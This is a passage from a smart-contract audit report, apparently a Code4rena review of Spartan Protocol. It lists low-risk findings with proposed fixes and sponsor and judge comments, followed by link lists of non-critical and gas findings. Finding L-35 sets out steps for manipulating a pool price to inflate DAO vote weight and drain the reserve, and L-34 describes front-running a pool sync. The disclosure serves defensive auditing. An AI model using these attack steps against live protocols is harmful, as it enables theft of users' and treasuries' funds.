during initialization or during setting is a security best-practice. However, such checks are missing in address variable initializations/changes in many places. Given that zero-address is used as an indicator for BNB, there is a greater risk of using it accidentally.\n\nAllowing zero-addresses will lead to contract reverts and force redeployments if there are no setters for such address variables.\n\nRecommend adding zero-address checks for all initializations/setters of all address state variables.\n\n## [[L-14] Mismatch in event definition](https://github.com/code-423n4/2021-07-spartan-findings/issues/210)\n\nIn synthFactory.sol, there's an `event CreateSynth(address indexed token, address indexed pool)`. However the event is emitted with \"synth\" as second output.\n\nRecommend thinking about what's the better variable to be emitted, and correct one of the lines.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/210#issuecomment-886304612):**\n > Code can be a little bit more cleaner\n\n## [[L-15] Missing revert if denominator = 0](https://github.com/code-423n4/2021-07-spartan-findings/issues/214)\n\nIn [Synth.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Synth.sol#L176), the function `burnSynth()` calculates a division between two variables. Since they can be zero, it's better to have a require with a clear error message when the division is not possible, otherwise an user wouldn't know why a transaction reverted.\n\nRecommend adding a `require(denom != 0, \"LPDebt = 0\")`.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/214#issuecomment-886303220):**\n > low risk but will help with error identification\n\n## [[L-16] Missing input validation `zapLiquidity()`](https://github.com/code-423n4/2021-07-spartan-findings/issues/222)\n\n`zapLiquidity()` in [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L59) misses an input validation unitsInput > 0.\n\nRecommend adding an input validation for `unitsInput`.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/222#issuecomment-886298131):**\n > Low risk but valid\n\n## [[L-17] Loss of precision](https://github.com/code-423n4/2021-07-spartan-findings/issues/224)\n\nIn [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L274), there's a loss of precision that can be corrected by shifting the operations.\n\nConsider rewriting L274-275 with `uint numerator = (_fees * reserve) / eraLength / maxTrades;`.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/224#issuecomment-886296064):**\n > Suggested mitigation is valid\n\n## [[L-18] Missing input validation in `addLiquidityForMember()`](https://github.com/code-423n4/2021-07-spartan-findings/issues/225)\n\nIn [Router.sol](https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L51), the function `addLiquidityForMember()` doesn't check inputBase and `inputToken`. Since we know they can't both be zero (it wouldn't change anything and user pays the gas for nothing).\n\nRecommend considering adding a require `inputBase>0 || inputToken>0`.\n\n## [[L-19] Dao.sol: Unbounded Iterations in `claimAllForMember()`](https://github.com/code-423n4/2021-07-spartan-findings/issues/37)\n\nThe `claimAllForMember()` function iterates through the full list of `listedAssets`. Should `listedAssets` become too large, as more assets are listed, calling this function will run out of gas and fail.\n\nA good compromise would be to take in an array of asset indexes, so that users can claim for multiple assets in multiple parts.\n\n```jsx\nfunction claimAllForMember(address member, uint256[] calldata assetIndexes)  external returns (bool){\n    address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n    for(uint i = 0; i < assetIndexes.length; i++){\n        uint claimA = calcClaimBondedLP(member, listedAssets[assetIndexes[i]]); // Check user's unlocked Bonded LPs for each asset\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(listedAssets[assetIndexes[i]], member); // Claim LPs if any unlocked\n        }\n    }\n    return true;\n}\n```\n\n**[SamusElderg (Spartan) confirmed ](https://github.com/code-423n4/2021-07-spartan-findings/issues/37#issuecomment-896558338):**\n > Whilst the history array of bondable assets is unlikely to ever exceed maybe 2 - 4 assets; I still like this suggested compromise from a user's gas-optimization perspective. The UI will always know exactly what assets the user should be able to claim before they press the button to 'claim all'; so i would like to see us pad this idea out\n\n## [[L-20] Missing parameter validation](https://github.com/code-423n4/2021-07-spartan-findings/issues/147)\n\nSome parameters of functions are not checked for invalid values:\n- `PoolFactory.constructor`: Validate `_base` and `_wbnb` to be contracts or at least non-zero\n\nA wrong user input or wallets defaulting to the zero addresses for a missing input can lead to the contract needing to redeploy or wasted gas.\n\nRecommend validating the parameters.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/147#issuecomment-894847120):**\n > Keeping this a low risk. Not sure why sponsor disputed.\n\n## [[L-21] Can accidentally lose tokens when removing liquidity from pool 2](https://github.com/code-423n4/2021-07-spartan-findings/issues/161)\n\nThe `Pool.removeLiquiditySingle` function redeems liquidity tokens for underlying to the router contract in case of the `token` being the zero address.\nThis works if the underlying token is actually `WBNB` but if the pool token is different and the user accidentally inserted `0` as the `token` address, it tries to swap a zero-balance WBNB to `BASE` and the redeemed tokens are stuck.\n\nIf `token == 0` add a check for `pool.token == WBNB` such that it is ensured that the pool's token is actually `WBNB`.\n\n**[verifyfirst (Spartan) disputed](https://github.com/code-423n4/2021-07-spartan-findings/issues/161#issuecomment-884637699):**\n > In theory this is correct, however, solidity validates function parameters to be legitimate and in this instance, 0 or \"0\" is not a valid address.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/161#issuecomment-894847911):**\n > I'll keep the issue as it's technically correct.\n\n## [[L-22]`MemberWithdraws` event not fired](https://github.com/code-423n4/2021-07-spartan-findings/issues/169)\n\nThe `MemberWithdraws` event of the DAO contract is not used. Unused code can hint at programming or architectural errors. Recommend use it or remove it.\n\n## [[L-23] `calcAsymmetricValueToken` never used](https://github.com/code-423n4/2021-07-spartan-findings/issues/170)\n\nThe `Utils.calcAsymmetricValueToken` function is not used. Unused code can hint at programming or architectural errors.\n\nRecommend using it or removing it.\n\n## [[L-24] `memberCount` not accurate](https://github.com/code-423n4/2021-07-spartan-findings/issues/26)\n\nThe function `depositForMember` of BondVault.sol adds user to the array `arrayMembers`. However it does this for each asset that a user deposits. Suppose a user deposit multiple assets, than the user is added multiple times to the array `arrayMembers`.\n\nThis will mean the `memberCount()` doesn't show accurate results. Also `allMembers()` will contain duplicate members\n\n```solidity\n// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/BondVault.sol#L60\nfunction depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){\n    if(!mapBondAsset_memberDetails[asset].isMember[member]){\n        mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)\n        arrayMembers.push(member); // Add user to member array (scope: vault)\n        mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)\n    }\n    ...\n\n// Get the total count of all existing & past BondVault members\nfunction memberCount() external view returns (uint256 count){\n    return arrayMembers.length;\n}\nfunction allMembers() external view returns (address[] memory _allMembers){\n    return arrayMembers;\n}\n```\n\nUse a construction like this:\n```solidity\nmapping(address => bool) isMember;\nif(!isMember[member]){\n        isMember[member] = true;\n        arrayMembers.push(member);\n}\n```\n\n**[SamusElderg (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/26#issuecomment-885523844):**\n > This appears to be true 👍\n> Will need to have some discussion around whether it is worth the extra gas for the extra check when adding the member.\n> My limited opinion is that it is worth the extra gas to add the extra conditional for this one and have counts lining up to the correct amount even if it isn't used elsewhere. But @verifyfirst (Spartan) ill let you decide on that!\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/26#issuecomment-894850416):**\n > Sponsor confirmed so I'm keeping this\n\n## [[L-25] check if pool exists in `getPool` ](https://github.com/code-423n4/2021-07-spartan-findings/issues/5)\n\nThe function `getPool` doesn't check if the pool exits (e.g. it doesn't check if the resulting pool !=0)\nOther functions use the results of `getPool` and do followup actions.\n\nFor example `createSynth` checks `isCuratedPool(_pool)` == true; if somehow `isCuratedPool(0)` would set to be true, then further actions could be done.\nAs far as I can see no actual problem occurs, but this is a dangerous construction and future code changes could introduce vulnerabilities.\nAdditionally the reverts that will occur if the result of `getPool`==0 are perhaps difficult to troubleshoot.\n\n```solidity\n//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L119\nfunction getPool(address token) public view returns(address pool){\n    if(token == address(0)){\n        pool = mapToken_Pool[WBNB];   // Handle BNB\n    } else {\n        pool = mapToken_Pool[token];  // Handle normal token\n    }\n    return pool;\n}\n\nfunction createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){\n    require(getPool(token) == address(0)); // Must be a valid token\n\nfunction createPool(address token) external onlyDAO returns(address pool){\n    require(getPool(token) == address(0)); // Must be a valid token\n```\n```solidity\n// https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/synthFactory.sol#L37\nfunction createSynth(address token) external returns(address synth){\n    require(getSynth(token) == address(0), \"exists\"); // Synth must not already exist\n    address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n    require(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true, \"!curated\"); // Pool must be Curated\n```\n\n\nRecommend In function `getPool` add something like:\n```solidity\nrequire  (pool !=0, \"Pool doesn't exist\");\n```\n\nNote: the functions `createPoolADD` and `createPool` also have to be changed, to use a different way to verify the pool doesn't exist.\n\n## [[ L-26]\t`Approval` event not emitted if the allowance is the maximum](https://github.com/code-423n4/2021-07-spartan-findings/issues/231)\n\nAccording to the BEP20 specification, the `Approval` event:\n\nMUST trigger on any successful call to `approve(address _spender, uint256 _value)`.\n\nHowever, the implementation of pool LP tokens and synths do not emit the `Approval` event when the allowance is the maximum number, i.e., type(uint256).max.\n\nRecommend emitting the approval event whenever the approve call succeeds, even if the allowance does not change.\n\n## [[L-27] Utils.sol: Combine Swap Output + Fee Calculation to avoid Rounding Errors + Integer Overflow [Updated]](https://github.com/code-423n4/2021-07-spartan-findings/issues/34)\n\nFor minting, burning of synths and swaps, the fee and output amounts are calculated separately via `calcSwapOutput` and `calcSwapFee`. To avoid rounding errors and duplicate calculations, it would be best to combine both of these functions and return both outputs at once.\n\nFor example, if we take `x = 60000, X = 73500, Y = 50321`, the actual swap fee should be `10164.57` and output `12451.6`. However, `calcSwapOutput` and `calcSwapFee` returns `10164` and `12451`, leaving 1 wei unaccounted for. This can be avoided by combining the calculations as suggested below. The fee and actual output will be `10164` and `12452` instead.\n\nFunctions that have to call `calcSwapOutput` within the contract (eg. `calcSwapValueInBaseWithPool`) should call this function as well, for calculation consistency.\n\nIn addition, calculations for both `calcSwapOutput` and `calcSwapFee` will phantom overflow if the input values become too large. (Eg. `x = 2^128, Y=2^128`). This can be avoided by the suggested implementation below using the FullMath library.\n\n```jsx\nfunction calcSwapFeeAndOutput(uint x, uint X, uint Y) public pure returns (uint output, uint swapFee) {\n    uint xAddX = x + X;\n    uint rawOutput = FullMath.mulDiv(x, Y, xAddX);\n    swapFee = FullMath.mulDiv(rawOutput, x, xAddX);\n    output = rawOutput - swapFee;\n}\n\nfunction calcSwapValueInBaseWithPool(address pool, uint amount) public view returns (uint _output){\n    uint _baseAmount = iPOOL(pool).baseAmount();\n    uint _tokenAmount = iPOOL(pool).tokenAmount();\n    (_output, ) = calcSwapFeeAndOutput(amount, _tokenAmount, _baseAmount);\n}\n```\n\nThe `FullMath` library is included (and made compatible with sol 0.8+) on the issue page for convenience.\n\n## [[L-28] Dao.sol: Reserve emissions must be turned on for `depositLPs` and bonds](https://github.com/code-423n4/2021-07-spartan-findings/issues/44)\n\n`depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.\n\nHence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.\n\nCache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration.\n\n## [[L-29] Missing zero address check on `BondVault` constructor](https://github.com/code-423n4/2021-07-spartan-findings/issues/144)\n\nThis is a low risk vulnerability due to the fact that it is possible to lose funds if the Base address is set to a zero address and someone sends funds to this address. As a rule, there should always be checks to make sure that initialized addresses are never a zero address.\n\nAccording to Slither analysis documentation (https://github.com/crytic/slither/wiki/Detector-Documentation#exploit-scenario-49), there needs to be a zero address checkpoint when initializing a base address in a contract. In the case for `BondVault`, the constructor initializes a base address. There should be a check to make sure this address is never zero to make sure there is no way to lose funds.\n\nSlither detector:\n\nmissing-zero-check:\n\n`BondVault.constructor(address)._base` (contracts/BondVault.sol#37) lacks a zero-check on : `BASE = _base (contracts/BondVault.sol#38)`\n\n------------------------------------------------\n\nSee issue page for Slither output from console (JSON format):\n\n**Recommend**:\n1. Clone repository for Spartan Smart Contracts\n2. Create a python virtual environment with a stable python version\n3. Install Slither Analyzer on the python VEM\n4. Run Slither against all contracts\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/144)**\n\n## [[L-30] Can't add BNB with `createPoolADD`](https://github.com/code-423n4/2021-07-spartan-findings/issues/7)\n\nThe function `createPoolADD()` supports the input of BNB, which it detects by checking `token == address(0)`\nLater it calls `_handleTransferIn(token, ...);` with the original value of token, which can be 0.\n\nHowever in the function `_handleTransferIn()` in poolFactory.sol there is no provision to transfer BNB (it doesn't check for _token == 0), so it will revert when you try to add BNB.\n\nAs a comparison, the function `_handleTransferIn()` of Router.sol does check for _token == address(0) and takes appropriate action.\n```solidity\n//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/poolFactory.sol#L45\nfunction createPoolADD(uint256 inputBase, uint256 inputToken, address token) external payable returns(address pool){\n...\n    address _token = token;\n    if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        ...\n    _handleTransferIn(token, inputToken, pool); // Transfer TOKEN liquidity to new pool\n\nfunction _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){\n    if(_amount > 0) {\n        uint startBal = iBEP20(_token).balanceOf(_pool);\n        iBEP20(_token).transferFrom(msg.sender, _pool, _amount);\n        actual = iBEP20(_token).balanceOf(_pool) - (startBal);\n    }\n}\n```\n```solidity\n//https://github.com/code-423n4/2021-07-spartan/blob/main/contracts/Router.sol#L197\nfunction _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){\n    if(_amount > 0) {\n        if(_token == address(0)){\n            require((_amount == msg.value));\n            (bool success, ) = payable(WBNB).call{value: _amount}(\"\"); // Wrap BNB\n            require(success, \"!send\");\n            iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool\n            actual = _amount;\n        } else {\n            uint startBal = iBEP20(_token).balanceOf(_pool); // Get prior TOKEN balance of pool\n            iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool\n            actual = iBEP20(_token).balanceOf(_pool)-(startBal); // Get received TOKEN amount\n        }\n    }\n}\n```\n\nRecommend applying the same function as `_handleTransferIn` of Router.sol to `_handleTransferIn` of poolFactory.sol. Better yet deduplicate the function by moving it to a library/included solidity file. Note:  There is also a  `_handleTransferIn` in Synth.sol which isn't used.\n\n**[SamusElderg (Spartan) disputed](https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-884629116):**\n > Whilst true; the intention is always that BNB will already be listed as standard; so the user's createPoolADD() function is irrelevant to BNB. However, this was not made clear anywhere; so is a good observation! @verifyfirst (Spartan) should we leave this? Or Block BNB pool thru that function? Or adjust the function to account for BNB even though it will already be listed?\n\n**[SamusElderg (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-885426407):**\n > No need for action on this one; BNB pool will be deployed at the same time.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/7#issuecomment-894854660):**\n > Per sponsor comment, low risk\n\n## [[L-31] Possible divide by zero errors in `Utils`](https://github.com/code-423n4/2021-07-spartan-findings/issues/232)\n\nSeveral functions in `Utils` do not handle edge cases where the divisor is 0, caused mainly by no liquidity in the pool. In such cases, the transactions revert without returning a proper error message.\n\nSee issue page for referenced code:\nRecommend checking if the divisors are 0 in the above functions to handle edge cases.\n\n**[verifyfirst (Spartan) confirmed](https://github.com/code-423n4/2021-07-spartan-findings/issues/232)**\n\n## [[L-32] Purging DAO deployer immediately in a single-step is risky](https://github.com/code-423n4/2021-07-spartan-findings/issues/96)\n\nThe DAO deployer is used as the authorized address in the modifier onlyDAO allowing it to set various critical protocol addresses and parameters. The `purgeDeployer()` function is expected to be called by the deployer once the DAO is stable and final. However, a single-step critical action such as this is extremely risky because it may be called accidentally and is irrecoverable from such mistakes.\n\nScenario 1: The DAO is not yet stable and final. But the deployer, e.g. controlled by an EOA, accidentally triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.\n\nScenario 2: The DAO is not yet stable and final but the deployer incorrectly assumes it is final and triggers this function. The protocol parameters/addresses can no longer be changed when required. The entire protocol has to be halted and redeployed. User funds have to be returned. Protocol reputation takes a hit.\n\nWhile a two-step process is generally recommended for critical address changes, a single-step purge/renounce is equally risky if it is controlled by an EOA and is not timelocked.\n\nAt a minimum, make sure that (1) deployer is not an EOA but a multisig controlled by mutually independent and trustworthy entities, (2) this function is timelocked.\n\nA better design change would be to let the DAO decide if it considers itself stable/final and let it vote for a proposal that purges the deployer.\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/96#issuecomment-885464482):**\n > Purge deployer is something that would be completed once the protocol is completely stable and future proof.\n> The risk of accidentally calling purgeDeployer is very low.\n> Suggested mitigations are considered.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/96#issuecomment-894857823):**\n > Possibility of this happening is very low so making this low risk\n\n## [[L-33] Calling `synthVault`:_deposit multiple times, will make you loose rewards](https://github.com/code-423n4/2021-07-spartan-findings/issues/65)\n\nCalling `deposit` multiple times will change the `mapMemberSynth_lastTime` to\n```solidity\nmapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime;\n```\n\nThis is used in [`calcCurrentReward`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L157) to calculate how much the user earned.\n\nEverytime the user calls `_deposit` (via deposit), the `mapMemberSynth_lastTime` will be set to a date in the future, meaning that they will loose all the rewards they accrued. Calling [`deposit`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L90) calls [`_deposit`](https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L102) without harvesting for the user meaning that they lost those rewards.\n\nRecommend force harvest user rewards at the beginning of every `_deposit()`\n\n**[verifyfirst (Spartan) acknowledged](https://github.com/code-423n4/2021-07-spartan-findings/issues/65#issuecomment-885455241):**\n > This is only an issue if a user directly interacts with the contracts - assuming they know what they are doing.\n> DAPP has already implemented deterrents to avoid this inconvenience for users.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/65#issuecomment-894858608):**\n > This requires user to call functions to deliberately harm themselves. Making this low risk.\n\n## [[L-34] Attacker can trigger pool sync leading to user fund loss](https://github.com/code-423n4/2021-07-spartan-findings/issues/120)\n\nAn attacker can front-run any operation that depends on the pool contract's internal balance amounts being unsynced to pool's balance on token/base contracts effectively nullifying the transfer of base/tokens for those operations. This will make `_getAddedBaseAmount()` and `_getAddedTokenAmount()` return 0 (because the balances are synced) from such operations.\n\nThe affected operations are: `addForMember()`, `swapTo()` and `mintSynth()` which will all take the user funds to respective contracts but will treat it as 0 (because of the syncing) and thus not add liquidity, return swapped tokens or mint any synths to the affected users. User loses deposited funds to the contract.\n\nRecommend adding access control to `sync()` function so that only Router can call it via `addDividend()`.\n\n**[verifyfirst (Spartan) confirmed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-884606104):**\n > Whilst we disagree with the above attack vector, it brings up a point about permissions on the pool's sync() function which was always intended to be called by anyone incase of accidentally send in.\n> However, we have decided to permission the sync to router only just for peace of mind.\n\n**[SamusElderg (Spartan) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-889636297):**\n > To be clear; this is non-critical based on the warden's outlined scenario. Front-running a user's txn would mean sync() is called before the user's funds are sent in, so sync() would have no effect on a txn that hasn't happened yet. Unpermissioned sync() Might however have low risk or otherwise in other scenarios but cant simulate or think of any. Regardless we will permission sync() to close any vector that has not been thought of there.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/120#issuecomment-894862095):**\n > Per sponsor comment, I align with low risk\n\n## [[L-35] Vote weight can be manipulated](https://github.com/code-423n4/2021-07-spartan-findings/issues/176)\n\nThe vote weight is determined by the `DAOVault` and `BondVault` weight (`voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)`).\nThe weight in these vaults is the deposited LP token.\nThe `BondVault` however pays for the `BASE` part itself (see `DAO.handleTransferIn`), therefore one only needs to deposit `tokens` and the `DAO` matches the **swap value**.\n\nTherefore, it's possible to manipulate the pool, deposit only a small amount of `tokens` (receiving a large amount of matching `BASE` by the DAO) and receive a large amount of LP tokens this way.\n attack can be profitable:\n\n1. Manipulate the pool spot price by dripping a lot of `BASE` into it repeatedly (sending lots of smaller trades is less costly due to the [path-independence of the continuous liquidity model](https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the `BASE` per `token` price.\n2. Repeatedly call `DAO.bond(amount)` to drip `tokens` into the `DAO` and get matched with `BASE` tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the LP minting is relative to the manipulated low `token` reserve, a lot of LP units are minted for a low amount of `tokens`, leading to receiving large weight.\n3. Create a proposal to send the entire reserve balance to yourself by using `grantFunds`\n4. Unmanipulate the pool by sending back the `tokens` from 1. This might incur a loss.\n\nThe cost of the attack is the swap fees from the manipulation of 1. and 4. plus the (small due to manipulation) amount of tokens required to send in 2.\nThe profit can be the entire reserve amount which is unrelated to the pools (plus reclaiming lots of LP units over the span of the `BondVault` era).\nThe attack can be profitable under certain circumstances of:\n- high reserves\n- low liquidity in the pool\n\nI don't think the attack would be feasible if we couldn't get the `DAO` to commit the lion's share of the `BASE` required to acquire LP units through the `BondVault` incentives.\n\n**[verifyfirst (Spartan) disputed and disagreed with severity](https://github.com/code-423n4/2021-07-spartan-findings/issues/176#issuecomment-884649620):**\n > Warden must understand the bond program is extremely limited in time and amount of sparta allocated through the DAO.\n> If the attacker was able to obtain the entire bond allocation and weight is in sparta terms, the opportunity to attack would scale along with the pool depth and therefor total weight scales up along with the bond.\n> Grant funds will be capped at a % of the reserve.\n\n**[ghoul-sol (judge) commented](https://github.com/code-423n4/2021-07-spartan-findings/issues/176#issuecomment-894863957):**\n > Per sponsor comment, making this low risk\n\n# Non-Critical findings\n\n- [[N-01] Lack of emission of event when changing  dao fees](https://github.com/code-423n4/2021-07-spartan-findings/issues/215)\n- [[N-02] (out of scope) mintFromDAO of Sparta.sol can go over max supply](https://github.com/code-423n4/2021-07-spartan-findings/issues/10)\n- [[N-03] Router.sol: Better changeArrayFeeSize implementation](https://github.com/code-423n4/2021-07-spartan-findings/issues/35)\n- [[N-04] Synth.sol: Redundant _handleTransferIn, onlyDAO, DEPLOYER](https://github.com/code-423n4/2021-07-spartan-findings/issues/47)\n- [[N-05] Router.sol: lastMonth variable is private](https://github.com/code-423n4/2021-07-spartan-findings/issues/50)\n- [[N-06] Dao.sol: Return votes > consensus](https://github.com/code-423n4/2021-07-spartan-findings/issues/52)\n- [[N-07] DaoVault.sol & BondVault.sol: Discrepancies in mapping visibility](https://github.com/code-423n4/2021-07-spartan-findings/issues/53)\n- [[N-08] isEqual(): Inconsistent Implementation](https://github.com/code-423n4/2021-07-spartan-findings/issues/54)\n- [[N-09] Pool.sol + Synth.sol: Inconsistent Allowance Checking Implementation](https://github.com/code-423n4/2021-07-spartan-findings/issues/55)\n- [[N-10] Dao.sol: newParamProposal takes in uint32 param](https://github.com/code-423n4/2021-07-spartan-findings/issues/61)\n- [[N-11] Utils.sol: Calculation issue with Slippage Adjustment](https://github.com/code-423n4/2021-07-spartan-findings/issues/62)\n- [[N-12] Dao.sol: Unused hasMinority()](https://github.com/code-423n4/2021-07-spartan-findings/issues/69)\n- [[N-13] Contract file name does not follow coding conventions](https://github.com/code-423n4/2021-07-spartan-findings/issues/19)\n- [[N-14] Misleading comment and missing revert message](https://github.com/code-423n4/2021-07-spartan-findings/issues/31)\n- [[N-15] Ambiguous parameter name in `SynthVault`](https://github.com/code-423n4/2021-07-spartan-findings/issues/41)\n- [[N-16] Inconsistency in Function Naming](https://github.com/code-423n4/2021-07-spartan-findings/issues/75)\n- [[N-17] Max approvals are risky](https://github.com/code-423n4/2021-07-spartan-findings/issues/100)\n- [[N-18] isMember and arrayMembers are only added to but never removed from](https://github.com/code-423n4/2021-07-spartan-findings/issues/122)\n- [[N-19] Duplicated functionality in two functions is a maintainability risk](https://github.com/code-423n4/2021-07-spartan-findings/issues/125)\n- [[N-20] receive() function in Router allows locking of accidentally sent user’s BNB](https://github.com/code-423n4/2021-07-spartan-findings/issues/126)\n- [[N-21] Unused _token potentially indicates missing logic or is dead code](https://github.com/code-423n4/2021-07-spartan-findings/issues/128)\n- [[N-22] Lack of require() allows control flow to proceed leading to undefined behavior](https://github.com/code-423n4/2021-07-spartan-findings/issues/131)\n- [[N-23] Potential reentrancy may lead to unexpected behavior](https://github.com/code-423n4/2021-07-spartan-findings/issues/132)\n- [[N-24] Pool.burnSynth(address,address) is potentially reentrant](https://github.com/code-423n4/2021-07-spartan-findings/issues/203)\n- [[N-25] Dao.bond(address,uint256) is reentrant and payable](https://github.com/code-423n4/2021-07-spartan-findings/issues/195)\n- [[N-26] Missing check for token type/decimals in createPool](https://github.com/code-423n4/2021-07-spartan-findings/issues/136)\n- [[N-27] Missing synthReward](https://github.com/code-423n4/2021-07-spartan-findings/issues/221)\n- [[N-28] Critical protocol parameter changes should emit events](https://github.com/code-423n4/2021-07-spartan-findings/issues/90)\n- [[N-29] Missing event emit for MemberWithdraws](https://github.com/code-423n4/2021-07-spartan-findings/issues/94)\n- [[N-30] DAO approval amount too high for BASE](https://github.com/code-423n4/2021-07-spartan-findings/issues/156)\n- [[N-31] DAO approval amount too high for token](https://github.com/code-423n4/2021-07-spartan-findings/issues/157)\n- [[N-32] Pool: Can accidentally burn tokens by sending them to zero](https://github.com/code-423n4/2021-07-spartan-findings/issues/158)\n- [[N-33] Synth: Can accidentally burn tokens by sending them to zero](https://github.com/code-423n4/2021-07-spartan-findings/issues/159)\n- [[N-34] DAO.setGenesisFactors sets wrong `erasToEarn`](https://github.com/code-423n4/2021-07-spartan-findings/issues/173)\n- [[N-35] BondVault fails if no SPARTA in DAO](https://github.com/code-423n4/2021-07-spartan-findings/issues/175)\n- [[N-36] Critical protocol parameter changes should have sanity/threshold checks](https://github.com/code-423n4/2021-07-spartan-findings/issues/91)\n- [[N-37] Deflationary assets are not handled uniformly across the protocol](https://github.com/code-423n4/2021-07-spartan-findings/issues/101)\n- [[N-38] Old DAO continues to exist/function even after moving to a new DAO](https://github.com/code-423n4/2021-07-spartan-findings/issues/107)\n- [[N-39] Missing zero-address check on recipient address in transfer](https://github.com/code-423n4/2021-07-spartan-findings/issues/117)\n- [[N-40] Router.revenueDetails(uint256,address) potentially vulnerable to miner manipulation](https://github.com/code-423n4/2021-07-spartan-findings/issues/194)\n- [[N-41] DaoVault.constructor(address) is missing a zero address check](https://github.com/code-423n4/2021-07-spartan-findings/issues/198)\n- [[N-42] Pool._addPoolMetrics(uint256) is subject to potential miner manipulation](https://github.com/code-423n4/2021-07-spartan-findings/issues/201)\n- [[N-43] Strict equality used in claimForMemeber()](https://github.com/code-423n4/2021-07-spartan-findings/issues/143)\n- [[N-44] `approveAndCall` approve `max` amount of token](https://github.com/code-423n4/2021-07-spartan-findings/issues/33)\n\n# Gas Optimization (25)\n\n- [[G-01] BondVault.sol: Optimizations](https://github.com/code-423n4/2021-07-spartan-findings/issues/51)\n- [[G-02] Type mismatch between parameters of setGenesisFactors() and state variables](https://github.com/code-423n4/2021-07-spartan-findings/issues/95)\n- [[G-03] `POOLFACTORY.curatedPoolCount()` Gas Optimization](https://github.com/code-423n4/2021-07-spartan-findings/issues/84)\n- [[G-04] state variables that can be declared as immutable](https://github.com/code-423n4/2021-07-spartan-findings/issues/217)\n- [[G-05] state variable that can be declared as constant](https://github.com/code-423n4/2021-07-spartan-findings/issues/219)\n- [[G-06]\t`claimAllForMember` could be optimized](https://github.com/code-423n4/2021-07-spartan-findings/issues/24)\n- [[G-07] more efficient calls to DAO functions](https://github.com/code-423n4/2021-07-spartan-findings/issues/4)\n- [[G-08] Router.sol: Optimize calculation of totalTradeFees in addTradeFee()](https://github.com/code-423n4/2021-07-spartan-findings/issues/36)\n- [[G-09] Dao.sol: Restrict Function Visibilities](https://github.com/code-423n4/2021-07-spartan-findings/issues/48)\n- [[G-10] Pool.sol: Optimizations](https://github.com/code-423n4/2021-07-spartan-findings/issues/49)\n- [[G-11] Pool.sol + Router.sol: Set revenue directly as _fee](https://github.com/code-423n4/2021-07-spartan-findings/issues/56)\n- [[G-12] Router.sol: Redundant _token initialization in addLiquiditySingleForMember()](https://github.com/code-423n4/2021-07-spartan-findings/issues/57)\n- [[G-13] Dao.sol: Define BASE as iBEP20 instead of address](https://github.com/code-423n4/2021-07-spartan-findings/issues/60)\n- [[G-14] Utils.sol: Redundant two assignment in 